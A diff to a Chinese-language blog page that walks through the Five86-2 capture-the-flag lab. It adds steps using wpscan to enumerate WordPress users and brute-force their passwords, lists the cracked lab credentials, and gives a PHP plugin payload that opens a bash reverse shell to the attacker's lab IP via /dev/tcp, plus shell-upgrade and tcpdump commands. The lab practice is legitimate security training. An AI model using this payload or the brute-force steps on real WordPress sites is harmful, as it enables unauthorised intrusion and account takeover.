@@ -55,8 +55,11 @@
 <meta property="og:image" content="https://i.loli.net/2021/05/14/LwxjPEQHvTBUK68.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/14/e4d3WR8wcLba9XV.jpg">
 <meta property="og:image" content="https://i.loli.net/2021/05/14/2xlvmORPjBCTIt8.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/nrgfwdBFH7Wqkx5.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/tywcNYSPUJsLlnV.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/vViWaf52dl8Jgns.png">
 <meta property="article:published_time" content="2021-05-10T14:20:36.000Z">
-<meta property="article:modified_time" content="2021-05-14T09:22:34.613Z">
+<meta property="article:modified_time" content="2021-05-14T13:44:34.852Z">
 <meta property="article:author" content="Du1">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -439,7 +442,29 @@
 <p>root 里面轻取 flag：</p>
 <p><img src="https://i.loli.net/2021/05/14/2xlvmORPjBCTIt8.jpg"></p>
 <h2 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86-2"></a>Five86-2</h2><p>Nmap 扫：</p>
+<p><img src="https://i.loli.net/2021/05/14/nrgfwdBFH7Wqkx5.png"></p>
 <p>无法加载的话可以尝试在 C:\Windows\System32\drivers\etc\hosts 添加一条 <code>192.168.237.138 five86-2</code>（靶机 IP 自改）。</p>
+<p>是 WordPress 框架，用 wpscan 爆破用户名：<code>wpscan --url &quot;http://192.168.237.138&quot; -e u</code></p>
+<p><img src="https://i.loli.net/2021/05/14/tywcNYSPUJsLlnV.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">barney</span><br><span class="line">stephen</span><br><span class="line">gillian</span><br></pre></td></tr></table></figure>
+
+<p>然后使用 kali 自带的 rockyou.txt 爆一下密码：（rockyou.txt 是由 rockyou.txt.gz 解压而来）（爆你🐎一年）</p>
+<p><code>wpscan --url &quot;http://192.168.237.138&quot; -U user.txt -P /usr/share/wordlists/rockyou.txt</code></p>
+<p><img src="https://i.loli.net/2021/05/14/vViWaf52dl8Jgns.png"></p>
+<p>爆出来两对：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Username: barney, Password: spooky1</span><br><span class="line">Username: stephen, Password: apollo1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;205735.html</span><br><span class="line"></span><br><span class="line">插件传马</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php exec(&quot;&#x2F;bin&#x2F;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.237.253&#x2F;2333 0&gt;&amp;1&#39;&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/darker0019527/article/details/80718005">https://blog.csdn.net/darker0019527/article/details/80718005</a></p>
+<p>tcp ftp</p>
+<p><code>tcpdump -i br-eca3858d86bf -w ftp.pcap</code></p>
 
   </div>
 </article>
